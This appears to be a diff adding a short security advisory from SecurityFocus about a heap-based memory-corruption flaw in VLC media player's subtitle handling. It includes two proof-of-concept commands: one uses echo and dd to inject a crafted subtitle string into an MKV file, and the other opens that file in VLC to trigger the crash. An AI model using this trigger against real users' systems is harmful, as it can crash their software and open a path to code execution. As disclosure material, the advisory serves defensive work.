@@ -1,0 +1,13 @@
+Source:  http://www.securityfocus.com/bid/46008/info
+
+VLC media player is prone to a heap-based memory-corruption vulnerability.
+
+Attackers may leverage this issue to execute arbitrary code in the context of the application. Failed attacks will cause denial-of-service conditions.
+
+An attacker can exploit this issue by enticing an unsuspecting user to open a malicious media file containing malicious subtitles with the vulnerable application.
+
+The following proof-of-concept commands are available:
+
+1. echo -ne '<foo\0crashme' | dd conv=notrunc bs=1 seek=877862 \ of=refined-australia-blu720p-sample.mkv
+
+2. vlc --sub-language English refined-australia-blu720p-sample.mkv 
